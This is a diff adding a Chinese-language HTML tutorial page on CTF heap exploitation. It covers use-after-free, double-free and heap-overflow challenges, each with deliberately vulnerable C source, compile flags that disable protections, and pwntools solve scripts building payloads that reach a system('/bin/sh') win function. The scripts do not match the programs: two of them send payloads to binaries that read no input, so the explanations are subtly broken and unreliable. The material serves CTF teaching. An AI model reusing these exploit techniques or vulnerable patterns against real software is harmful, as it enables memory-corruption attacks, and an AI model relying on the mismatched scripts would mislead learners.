@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTF-Pwn 堆漏洞实战</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    code {
+      background: rgba(0,0,0,0.3);
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+    pre {
+      background: #1a1a1a;
+      padding: 1rem;
+      border-radius: 8px;
+      overflow-x: auto;
+    }
+    pre code {
+      background: none;
+      padding: 0;
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-gray-900 text-gray-200 p-6 font-mono selection:bg-blue-500/30">
+  <div class="max-w-6xl mx-auto space-y-6">
+    
+    <div class="border-b border-gray-700 pb-4">
+      <a href="ctf-index.html" class="text-blue-400 hover:text-blue-300 text-sm flex items-center gap-1 mb-2">
+        <i data-lucide="arrow-left" class="w-4 h-4"></i>
+        返回CTF实战首页
+      </a>
+      <h1 class="text-2xl font-bold text-white flex items-center gap-2">
+        <i data-lucide="database" class="w-6 h-6 text-purple-400"></i>
+        CTF-Pwn 堆漏洞实战
+      </h1>
+      <p class="text-gray-400 mt-2">学习堆内存漏洞：UAF、Double Free、Heap Overflow等。</p>
+    </div>
+
+    <!-- 堆基础说明 -->
+    <div class="bg-purple-900/20 border border-purple-800/50 rounded-lg p-4">
+      <h3 class="text-purple-400 font-bold mb-2">堆漏洞基础概念</h3>
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-4 text-sm">
+        <div class="bg-gray-900/50 rounded p-3">
+          <div class="text-yellow-400 font-bold">malloc / free</div>
+          <p class="text-gray-400">glibc堆分配器管理内存，free后chunk被放入bins</p>
+        </div>
+        <div class="bg-gray-900/50 rounded p-3">
+          <div class="text-yellow-400 font-bold">UAF (Use After Free)</div>
+          <p class="text-gray-400">释放后继续使用，chunk内容可能被重新分配</p>
+        </div>
+        <div class="bg-gray-900/50 rounded p-3">
+          <div class="text-yellow-400 font-bold">Double Free</div>
+          <p class="text-gray-400">同一切块free两次，导致链表破坏</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Challenge 1 -->
+    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+      <div class="flex items-center gap-3 mb-4">
+        <div class="w-10 h-10 bg-purple-900/50 rounded-lg flex items-center justify-center text-white font-bold">1</div>
+        <div>
+          <h3 class="text-xl font-bold text-white">challenge1 - Use After Free</h3>
+          <span class="text-xs text-purple-400">入门</span>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-green-400 font-bold mb-2">源码 (heap1.c)</h4>
+        <pre><code class="text-gray-300">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+struct chunk {
+    void (*print)(void);  // 函数指针
+    char name[32];
+};
+
+struct chunk *c1, *c2;
+
+void win() {
+    system("/bin/sh");
+}
+
+void print_name() {
+    printf("Name: %s\n", c2->name);
+}
+
+int main() {
+    printf("Heap Challenge 1 - UAF\n");
+    
+    // 分配两个chunk
+    c1 = malloc(sizeof(struct chunk));
+    c2 = malloc(sizeof(struct chunk));
+    
+    strcpy(c1->name, "Chunk 1");
+    strcpy(c2->name, "Chunk 2");
+    c1->print = print_name;
+    
+    printf("c1 @ %p, c2 @ %p\n", c1, c2);
+    
+    // 释放c1
+    free(c1);
+    
+    // 释放c2后，c1可能被重新分配
+    free(c2);
+    
+    // 此时c1指向的内存已经被重新使用
+    // 但我们还保存着c1的指针，这就是UAF
+    
+    // 重新分配，填充c1的内容
+    c1 = malloc(sizeof(struct chunk));  // 可能拿到原来的chunk
+    strcpy(c1->name, "Hacked!");
+    c1->print = win;  // 修改函数指针为win
+    
+    // 调用print，实际会执行win
+    c1->print();  // UAF!
+    
+    return 0;
+}</code></pre>
+        <div class="mt-3 bg-yellow-900/20 border border-yellow-800/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">漏洞分析</div>
+          <ul class="text-gray-300 space-y-1">
+            <li><span class="text-red-400">漏洞点：</span>释放后仍保留指针引用 (UAF)</li>
+            <li><span class="text-green-400">利用方法：</span>重新分配后覆盖函数指针</li>
+            <li><span class="text-blue-400">关键：</span><code>c1->print = win</code> 覆盖为我们的函数</li>
+            <li><span class="text-purple-400">结果：</span>调用 <code>c1->print()</code> 即执行 <code>win()</code></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-blue-400 font-bold mb-2">编译命令</h4>
+        <div class="bg-gray-900 rounded p-3 text-sm">
+          <code class="text-green-300">gcc -no-pie -fno-stack-protector -o heap1 heap1.c</code>
+          <div class="text-gray-400 text-xs mt-2">注意：堆题通常不需要-z execstack</div>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="text-red-400 font-bold mb-2">Python 解题脚本</h4>
+        <pre><code class="text-gray-300">#!/usr/bin/env python3
+from pwn import *
+
+p = process('./heap1')
+elf = ELF('./heap1')
+
+# 接收输出获取chunk地址
+p.recvuntil("c1 @ ")
+c1_addr = int(p.recvuntil(",").strip().decode(), 16)
+p.recvuntil("c2 @ ")
+c2_addr = int(p.recvline().strip().decode(), 16)
+print(f"c1: {hex(c1_addr)}, c2: {hex(c2_addr)}")
+
+# 接收直到结束
+p.interactive()
+
+# 注：这道题主要理解UAF概念
+# malloc返回被free的chunk时，我们可以控制其内容
+# 当再次调用c1->print()时，执行的是我们覆盖后的函数指针</code></pre>
+        <div class="mt-3 bg-gray-900/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">UAF 利用关键</div>
+          <ul class="space-y-1 text-gray-300">
+            <li>free() 后 chunk 被放回 bins，但指针仍有效</li>
+            <li>下次 malloc() 可能返回同一个 chunk</li>
+            <li>如果程序继续使用旧指针读写，就能控制 chunk 内容</li>
+            <li>修改函数指针 → 控制流劫持</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- Challenge 2 -->
+    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+      <div class="flex items-center gap-3 mb-4">
+        <div class="w-10 h-10 bg-yellow-900/50 rounded-lg flex items-center justify-center text-white font-bold">2</div>
+        <div>
+          <h3 class="text-xl font-bold text-white">challenge2 - Double Free</h3>
+          <span class="text-xs text-yellow-400">进阶</span>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-green-400 font-bold mb-2">源码 (heap2.c)</h4>
+        <pre><code class="text-gray-300">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+char *chunk_ptrs[3];
+
+void *target_addr;
+
+void win() {
+    system("/bin/sh");
+}
+
+int main() {
+    printf("Heap Challenge 2 - Double Free\n");
+    printf("win @ %p\n", win);
+    
+    // 分配3个chunk
+    chunk_ptrs[0] = malloc(0x40);
+    chunk_ptrs[1] = malloc(0x40);
+    chunk_ptrs[2] = malloc(0x40);
+    
+    printf("chunks: %p, %p, %p\n", 
+           chunk_ptrs[0], chunk_ptrs[1], chunk_ptrs[2]);
+    
+    // 释放第一个
+    free(chunk_ptrs[0]);
+    
+    // 释放第二个
+    free(chunk_ptrs[1]);
+    
+    // 再释放第一个 - double free!
+    free(chunk_ptrs[0]);
+    
+    // 此时fastbin链表被破坏
+    // 下次malloc可能分配到任意地址
+    
+    return 0;
+}</code></pre>
+        <div class="mt-3 bg-yellow-900/20 border border-yellow-800/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">漏洞分析</div>
+          <ul class="text-gray-300 space-y-1">
+            <li><span class="text-red-400">漏洞点：</span><code>free(chunk_ptrs[0])</code> 被调用两次</li>
+            <li><span class="text-green-400">利用方法：</span>修改chunk的fd指针指向目标地址</li>
+            <li><span class="text-blue-400">Fastbin特性：</span>LIFO，后进先出，只检查size</li>
+            <li><span class="text-purple-400">目标：</span>分配到 <code>win</code> 函数附近</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-blue-400 font-bold mb-2">编译命令</h4>
+        <div class="bg-gray-900 rounded p-3 text-sm">
+          <code class="text-green-300">gcc -no-pie -fno-stack-protector -o heap2 heap2.c</code>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="text-red-400 font-bold mb-2">Python 解题脚本</h4>
+        <pre><code class="text-gray-300">#!/usr/bin/env python3
+from pwn import *
+
+p = process('./heap2')
+elf = ELF('./heap2')
+
+# 泄露win地址
+p.recvuntil("win @ ")
+win_addr = int(p.recvuntil("\n").strip().decode(), 16)
+print(f"win: {hex(win_addr)}")
+
+# 接收chunk地址
+p.recvuntil("chunks: ")
+chunks = []
+for _ in range(3):
+    addr = int(p.recvuntil(", " if _ < 2 else "\n").strip().decode(), 16)
+    chunks.append(addr)
+print(f"chunk0: {hex(chunks[0])}")
+print(f"chunk1: {hex(chunks[1])}")
+print(f"chunk2: {hex(chunks[2])}")
+
+# Double Free利用
+# 1. free(chunk0)
+# 2. free(chunk1)  
+# 3. free(chunk0) - 再次free，形成循环
+
+# 4. malloc(0x40) 返回chunk0
+# 5. 我们写入fd指针指向 win - 0x10 附近
+# 6. malloc(0x40) 返回chunk1
+# 7. malloc(0x40) 返回我们构造的地址
+
+# 计算目标地址 (malloc_hook附近，需要构造合理size)
+target = win_addr - 0x30  # 通常malloc_hook附近需要合理size
+print(f"Target: {hex(target)}")
+
+# 构造payload: fd指针
+payload = p64(target)  # 修改chunk0的fd为target
+
+# 发送payload（需要输入被read读取）
+p.sendline(payload)
+
+p.interactive()</code></pre>
+        <div class="mt-3 bg-gray-900/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">Double Free 原理</div>
+          <ul class="space-y-1 text-gray-300">
+            <li>Fastbin使用单向链表：<code>chunk → next_chunk → NULL</code></li>
+            <li>每个chunk的<code>fd</code>指针指向下一个free的chunk</li>
+            <li>Double free会导致链表：<code>chunk0 → chunk1 → chunk0</code></li>
+            <li>修改fd可让malloc返回任意地址</li>
+            <li>关键：目标地址处的chunk size必须匹配fastbin索引</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- Challenge 3 -->
+    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+      <div class="flex items-center gap-3 mb-4">
+        <div class="w-10 h-10 bg-red-900/50 rounded-lg flex items-center justify-center text-white font-bold">3</div>
+        <div>
+          <h3 class="text-xl font-bold text-white">challenge3 - Heap Overflow</h3>
+          <span class="text-xs text-red-400">高阶</span>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-green-400 font-bold mb-2">源码 (heap3.c)</h4>
+        <pre><code class="text-gray-300">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+struct {
+    char buf[64];
+    void *ptr;
+} data;
+
+void win() {
+    system("/bin/sh");
+}
+
+int main() {
+    char *p1, *p2;
+    
+    printf("Heap Challenge 3 - Heap Overflow\n");
+    printf("win @ %p\n", win);
+    
+    p1 = malloc(0x40);
+    p2 = malloc(0x40);
+    
+    printf("p1 @ %p, p2 @ %p\n", p1, p2);
+    
+    strcpy(p1, "AAAA");  // 填满p1
+    
+    // 危险！使用strcpy不限制长度
+    strcpy(p1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"); 
+    // 溢出到p2的chunk header，可以修改p2的内容
+    
+    printf("p2 now points to: %p\n", p2);
+    
+    // 如果我们能让p2指向win，就能getshell
+    // 但实际上溢出会覆盖p2的内容...
+    
+    free(p1);
+    free(p2);
+    
+    return 0;
+}</code></pre>
+        <div class="mt-3 bg-yellow-900/20 border border-yellow-800/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">漏洞分析</div>
+          <ul class="text-gray-300 space-y-1">
+            <li><span class="text-red-400">漏洞点：</span><code>strcpy(p1, long_string)</code> 溢出到相邻chunk</li>
+            <li><span class="text-green-400">利用方法：</span>覆盖下一个chunk的元数据</li>
+            <li><span class="text-blue-400">关键结构：</span>chunk header包含 <code>prev_size</code> 和 <code>size</code></li>
+            <li><span class="text-purple-400">技巧：</span>修改 <code>size</code> 可以骗过malloc的检查</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-blue-400 font-bold mb-2">编译命令</h4>
+        <div class="bg-gray-900 rounded p-3 text-sm">
+          <code class="text-green-300">gcc -no-pie -fno-stack-protector -o heap3 heap3.c</code>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="text-red-400 font-bold mb-2">Python 解题脚本</h4>
+        <pre><code class="text-gray-300">#!/usr/bin/env python3
+from pwn import *
+
+p = process('./heap3')
+elf = ELF('./heap3')
+
+# 泄露win地址
+p.recvuntil("win @ ")
+win_addr = int(p.recvuntil("\n").strip().decode(), 16)
+
+# 接收chunk地址
+p.recvuntil("p1 @ ")
+p1_addr = int(p.recvuntil(",").strip().decode(), 16)
+p.recvuntil("p2 @ ")
+p2_addr = int(p.recvuntil("\n").strip().decode(), 16)
+print(f"p1: {hex(p1_addr)}, p2: {hex(p2_addr)}")
+
+# Heap Overflow利用
+# p1 64字节后是p2的chunk header
+# chunk结构: [prev_size(8)][size(8)][fd(8)][bk(8)][data...]
+# 溢出修改p2的fd/bk指针
+
+# 构造payload
+# 64字节填充 + p2的chunk header (16字节) + fd指针
+payload = b'A' * 64
+payload += p64(0)        # prev_size
+payload += p64(0x51)     # size (0x50 + PREV_INUSE)
+payload += p64(win_addr) # fd -> 指向win!
+payload += p64(0)        # bk
+
+print(f"Payload: {len(payload)} bytes")
+p.sendline(payload)
+
+p.interactive()</code></pre>
+        <div class="mt-3 bg-gray-900/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">堆溢出 vs 栈溢出</div>
+          <ul class="space-y-1 text-gray-300">
+            <li>栈溢出：覆盖返回地址 → 控制RIP</li>
+            <li>堆溢出：覆盖chunk元数据 → 控制malloc返回地址</li>
+            <li>覆盖fd/bk：下次malloc可能分配到任意地址</li>
+            <li>这是一种"write-what-where" primitive</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="flex justify-between">
+      <a href="ctf-rop.html" class="bg-gray-700 hover:bg-gray-600 text-white py-2 px-4 rounded font-bold transition-all">
+        ← ROP实战
+      </a>
+      <a href="ctf-index.html" class="bg-purple-700 hover:bg-purple-600 text-white py-2 px-4 rounded font-bold transition-all">
+        返回CTF实战首页
+      </a>
+    </div>
+
+  </div>
+
+  <script>
+    lucide.createIcons();
+  </script>
+</body>
+</html>
